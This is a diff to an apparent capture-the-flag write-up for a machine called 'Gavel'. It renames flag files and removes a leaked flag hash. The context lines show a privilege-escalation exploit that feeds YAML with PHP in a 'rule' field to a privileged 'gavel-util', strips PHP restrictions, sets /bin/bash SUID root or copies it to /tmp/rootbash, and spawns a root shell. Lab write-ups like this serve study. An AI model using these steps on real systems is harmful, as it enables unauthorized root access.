@@ -1,7 +1,7 @@
 ---
 title: Gavel
 slug: Gavel
-tags: [Linux, Vulnerability Research]
+tags: [Vulnerability Research]
 ---
 ## Executive Summary
 
@@ -401,9 +401,8 @@ auctioneer
 ```bash
 cd auctioneer
 ls
-user.txt
-cat user.txt
-2d5261d832ded787b97d196a12821a56
+local-proof.txt
+cat local-proof.txt
 ```
 # Root
 
@@ -453,7 +452,7 @@ Commands:
 2. **Submits them to `gavel-util`** (a program with high privileges)
 3. **First payload**: Removes PHP security restrictions (`disable_functions` and `open_basedir`)
 4. **Second payload**: Makes `/bin/bash` **SUID root** (so anyone running bash becomes root)
-5. **If successful**: Spawns a root shell and reads the root flag (`/root/root.txt`)
+5. **If successful**: Spawns a root shell and reads the privileged-access proof (`/root/privileged-proof.txt`)
 
 - `gavel-util` processes YAML files without sanitization
 - It executes PHP code from the `rule` field
@@ -500,8 +499,8 @@ sleep 2
 
 if ls -la /bin/bash | grep -q "rws"; then
     echo "[+] SUCCESS! /bin/bash is now SUID root."
-    echo "[*] Spawning root shell and reading /root/root.txt ..."
-    /bin/bash -p -c 'cat /root/root.txt; exec /bin/bash -p'
+    echo "[*] Spawning root shell and reading /root/privileged-proof.txt ..."
+    /bin/bash -p -c 'cat /root/privileged-proof.txt; exec /bin/bash -p'
 else
     echo "[-] Exploit failed. /bin/bash is not SUID."
     echo "[*] Trying alternative payload (copy bash)..."
@@ -522,8 +521,8 @@ EOF_COPY
 
     if [ -f /tmp/rootbash ]; then
         echo "[+] Alternative payload SUCCESS! /tmp/rootbash created."
-        echo "[*] Spawning root shell and reading /root/root.txt ..."
-        /tmp/rootbash -p -c 'cat /root/root.txt; exec /tmp/rootbash -p'
+        echo "[*] Spawning root shell and reading /root/privileged-proof.txt ..."
+        /tmp/rootbash -p -c 'cat /root/privileged-proof.txt; exec /tmp/rootbash -p'
     else
         echo "[-] All attempts failed."
         exit 1
